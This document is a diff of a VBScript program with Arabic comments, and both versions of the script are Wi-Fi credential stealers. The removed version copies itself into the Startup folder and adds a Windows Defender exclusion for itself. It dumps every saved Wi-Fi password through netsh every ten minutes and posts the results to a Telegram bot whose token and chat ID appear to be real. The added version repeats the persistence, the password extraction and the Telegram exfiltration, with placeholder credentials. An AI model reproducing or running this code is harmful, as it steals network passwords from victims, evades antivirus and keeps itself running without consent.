@@ -1,104 +1,93 @@
-' تعريف المتغيرات
-Dim objShell, objExec, objHTTP
-Dim wifiProfiles, profile, command, result, message, keyContent
-Dim botToken, chatID, apiURL
-Dim startupFolder, scriptPath
-
-' بيانات بوت تيليجرام
-botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc"  
-chatID = "5792222595"
-apiURL = "https://api.telegram.org/bot" & botToken & "/sendMessage"
-
-' إنشاء كائن Shell
 Set objShell = CreateObject("WScript.Shell")
 
-' إضافة السكربت إلى بدء التشغيل
-startupFolder = objShell.SpecialFolders("Startup")
-scriptPath = WScript.ScriptFullName
-If Not FileExists(startupFolder & "\" & WScript.ScriptName) Then
-    objShell.Run "cmd /c copy """ & scriptPath & """ """ & startupFolder & "\"""", 0, False
-End If
+' نسخ السكربت إلى مجلد بدء التشغيل
+CopyToStartup()
 
-' إضافة استثناء في ويندوز ديفيندر
-On Error Resume Next
-objShell.Run "powershell -Command Add-MpPreference -ExclusionPath """ & scriptPath & """", 0, False
-If Err.Number <> 0 Then
-    ' إدارة الخطأ إذا فشل الأمر
-    Err.Clear
-End If
-On Error GoTo 0
+' الحصول على اسم الشبكة وكلمة المرور
+GetWifiInfo()
 
-' تشغيل السكربت في الخلفية
-Do While True
-    ' تشغيل الأمر للحصول على جميع الشبكات المحفوظة
-    Set objExec = objShell.Exec("cmd /c netsh wlan show profiles")
-    wifiProfiles = objExec.StdOut.ReadAll()
-
-    ' استخراج أسماء الشبكات المحفوظة
-    message = "🔍 Wi-Fi Credentials Dump 🔍" & vbCrLf & vbCrLf
-    For Each profile In Split(wifiProfiles, vbCrLf)
-        If InStr(profile, "All User Profile") > 0 Then
-            profile = Trim(Split(profile, ":")(1))
-
-            ' تشغيل الأمر للحصول على تفاصيل الشبكة وكلمة المرور
-            command = "cmd /c netsh wlan show profile name=""" & profile & """ key=clear"
-            Set objExec = objShell.Exec(command)
-            result = objExec.StdOut.ReadAll()
-            
-            ' استخراج كلمة المرور
-            If InStr(result, "Key Content") > 0 Then
-                keyContent = Trim(Split(Split(result, "Key Content")(1), ":")(1))
-            Else
-                keyContent = "N/A"
-            End If
-            
-            ' إضافة البيانات إلى الرسالة
-            message = message & "📡 *Network:* `" & profile & "`" & vbCrLf
-            message = message & "🔑 *Password:* `" & keyContent & "`" & vbCrLf
-            message = message & "------------------------------" & vbCrLf
-        End If
-    Next
-
-    ' إرسال البيانات إلى تيليجرام
-    On Error Resume Next
-    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
-    objHTTP.Open "POST", apiURL, False
-    objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-    objHTTP.Send "chat_id=" & chatID & "&text=" & EncodeURIComponent(message) & "&parse_mode=Markdown"
-    If Err.Number <> 0 Then
-        ' إدارة الخطأ إذا فشل الإرسال
-        Err.Clear
+' دالة لنسخ السكربت إلى مجلد بدء التشغيل
+Sub CopyToStartup()
+    ' الحصول على مسار السكربت الحالي
+    scriptPath = WScript.ScriptFullName
+    ' الحصول على مسار مجلد بدء التشغيل
+    startupPath = objShell.SpecialFolders("Startup") & "\" & WScript.ScriptName
+    ' نسخ السكربت إلى مجلد بدء التشغيل
+    If scriptPath <> startupPath Then
+        objShell.Run "cmd /c copy """ & scriptPath & """ """ & startupPath & """", 0, False
     End If
-    On Error GoTo 0
+End Sub
 
-    ' تنظيف المتغيرات
-    Set objExec = Nothing
-    Set objHTTP = Nothing
+' دالة للحصول على اسم الشبكة وكلمة المرور
+Sub GetWifiInfo()
+    ' تنفيذ أمر netsh لاستخراج كلمة المرور
+    command = "netsh wlan show profiles"
+    Set exec = objShell.Exec(command)
 
-    ' الانتظار لمدة 10 دقائق قبل التنفيذ التالي
-    WScript.Sleep 600000
-Loop
+    ' قراءة الناتج
+    output = ""
+    Do While Not exec.StdOut.AtEndOfStream
+        output = output & exec.StdOut.ReadLine() & vbCrLf
+    Loop
 
-' دالة للتحقق من وجود الملف
-Function FileExists(filePath)
-    Dim fso
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    FileExists = fso.FileExists(filePath)
-    Set fso = Nothing
-End Function
+    ' البحث عن اسم الشبكة في الناتج
+    Set regex = New RegExp
+    regex.Pattern = "All User Profile\s*:\s*(.*)"
+    regex.IgnoreCase = True
+    regex.Global = True
+    Set matches = regex.Execute(output)
 
-' دالة لتشفير النص (URL Encoding)
-Function EncodeURIComponent(text)
-    Dim encodedText
-    encodedText = ""
-    Dim i, char
-    For i = 1 To Len(text)
-        char = Mid(text, i, 1)
-        If char Like "[A-Za-z0-9-_.!~*'()]" Then
-            encodedText = encodedText & char
+    ' عرض أسماء الشبكات المتاحة
+    For Each match In matches
+        networkName = match.SubMatches(0)
+
+        ' استخراج كلمة المرور للشبكة
+        command = "netsh wlan show profile name=" & Chr(34) & networkName & Chr(34) & " key=clear"
+        Set exec = objShell.Exec(command)
+        passwordOutput = ""
+        Do While Not exec.StdOut.AtEndOfStream
+            passwordOutput = passwordOutput & exec.StdOut.ReadLine() & vbCrLf
+        Loop
+
+        ' البحث عن كلمة المرور في الناتج
+        Set regexPassword = New RegExp
+        regexPassword.Pattern = "Key Content\s*:\s*(.*)"
+        regexPassword.IgnoreCase = True
+        Set passwordMatch = regexPassword.Execute(passwordOutput)
+
+        ' إذا وجدت كلمة المرور
+        If passwordMatch.Count > 0 Then
+            password = passwordMatch(0).SubMatches(0)
+            SendToTelegram networkName, password
         Else
-            encodedText = encodedText & "%" & Hex(Asc(char))
+            SendToTelegram networkName, "لا يوجد كلمة مرور لهذه الشبكة."
         End If
     Next
-    EncodeURIComponent = encodedText
-End Function
+End Sub
+
+' دالة لإرسال البيانات إلى Telegram
+Sub SendToTelegram(networkName, password)
+    ' معلومات البوت
+    botToken = "YOUR_BOT_TOKEN" ' استبدل ب token البوت الخاص بك
+    chatID = "YOUR_CHAT_ID" ' استبدل ب chat ID الخاص بك
+
+    ' نص الرسالة
+    message = "اسم الشبكة: " & networkName & vbCrLf & "كلمة المرور: " & password
+
+    ' إرسال الرسالة عبر API Telegram
+    url = "https://api.telegram.org/bot" & botToken & "/sendMessage"
+    postData = "chat_id=" & chatID & "&text=" & Server.URLEncode(message)
+
+    ' إنشاء كائن XMLHTTP لإرسال الطلب
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "POST", url, False
+    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    http.send postData
+
+    ' التحقق من نجاح الإرسال
+    If http.status = 200 Then
+        WScript.Echo "تم إرسال البيانات إلى Telegram بنجاح."
+    Else
+        WScript.Echo "فشل إرسال البيانات إلى Telegram."
+    End If
+End Sub
